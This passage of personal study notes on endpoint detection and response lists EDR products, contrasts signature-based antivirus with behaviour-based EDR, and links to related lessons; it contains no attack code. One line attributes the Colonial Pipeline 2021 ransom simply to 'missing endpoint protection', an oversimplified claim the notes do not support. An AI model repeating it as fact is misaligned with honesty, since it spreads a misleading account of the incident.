- Privilege escalation.
- Reverse shells (like the one I built in 12.14).

### The tools
- **CrowdStrike Falcon** (industry leader).
- **SentinelOne** (AI-driven).
- **Microsoft Defender for Endpoint** (built-in).
- **Carbon Black**.
- **Wazuh** (open-source HIDS).

### Real commands I ran
- `ps aux | head -10`

### Things I saw
- `bash`, `sshd`, `ps`, `head` (all normal).
- No malicious processes.
- An EDR would flag a reverse shell, crypto miner, or ransomware behavior.

### My own words (locked in)
- Endpoint = the device. The final battleground.
- Antivirus = signatures (known malware).
- EDR = behavior (new malware) + response.
- EDR records everything (processes, network, files).
- EDR kills the process, quarantines the file, isolates the machine.
- Reverse shells (like my mini-msf) are caught by EDR.
- Ransomware is caught by EDR (mass file encryption).
- Fileless malware is caught by EDR (in-memory behavior).
- Antivirus alone is a 1990s shield. EDR is 2026.
- Colonial Pipeline 2021 = $4.4M ransom due to missing endpoint protection.

### Connection to other topics
- 12.19 (Blue Team) — the SOC uses EDR.
- 12.21 (IDS/IPS) — network detection vs endpoint detection.
- 8.5 (Network Security) — the perimeter vs the endpoint.
- 12.14 (Exploitation) — the reverse shell EDR would catch.
- 12.16 (Network Attacks) — the MITM the endpoint can detect.
- 12.15 (Web Hacking) — the payload EDR would block.
- 12.20 (SIEM) — EDR feeds logs to the SIEM.
